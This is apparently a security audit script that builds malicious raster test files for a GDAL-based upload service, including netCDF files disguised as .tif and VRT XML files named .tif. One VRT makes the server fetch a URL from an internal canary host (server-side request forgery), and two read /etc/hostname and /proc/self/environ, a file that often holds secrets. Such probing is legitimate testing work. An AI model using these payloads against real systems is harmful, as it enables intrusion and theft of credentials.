import numpy as np, rasterio, shutil, os
from rasterio.transform import from_origin
W="/www"
prof=dict(driver="GTiff",width=64,height=64,count=1,dtype="uint8",crs="EPSG:4326",transform=from_origin(-105,40,0.001,0.001))
with rasterio.open(f"{W}/real.tif","w",**prof) as d: d.write(np.full((1,64,64),7,dtype="uint8"))
for fmt,name in (("NC","nc_classic"),("NC4","nc4")):
    import rasterio.shutil as rs
    rs.copy(f"{W}/real.tif",f"/tmp/{name}.nc",driver="netCDF",FORMAT=fmt)
    shutil.copy(f"/tmp/{name}.nc",f"{W}/{name}.tif")
open(f"{W}/canary.tif","wb").write(open(f"{W}/real.tif","rb").read())
vrt_ssrf='''<VRTDataset rasterXSize="64" rasterYSize="64"><SRS>EPSG:4326</SRS><GeoTransform>-105,0.001,0,40,0,-0.001</GeoTransform>
<VRTRasterBand dataType="Byte" band="1"><SimpleSource><SourceFilename relativeToVRT="0">/vsicurl/http://audit-canary:8080/canary.tif</SourceFilename><SourceBand>1</SourceBand></SimpleSource></VRTRasterBand></VRTDataset>'''
open(f"{W}/vrt_ssrf.tif","w").write(vrt_ssrf)
for name,src in (("vrt_raw_hostname","/etc/hostname"),("vrt_raw_environ","/proc/self/environ")):
    v=f'''<VRTDataset rasterXSize="64" rasterYSize="1"><VRTRasterBand dataType="Byte" band="1" subClass="VRTRawRasterBand">
<SourceFilename relativetoVRT="0">{src}</SourceFilename><ImageOffset>0</ImageOffset><PixelOffset>1</PixelOffset><LineOffset>64</LineOffset></VRTRasterBand></VRTDataset>'''
    open(f"{W}/{name}.tif","w").write(v)
for f in sorted(os.listdir(W)): print(f, os.path.getsize(f"{W}/{f}"), open(f"{W}/{f}","rb").read(8))
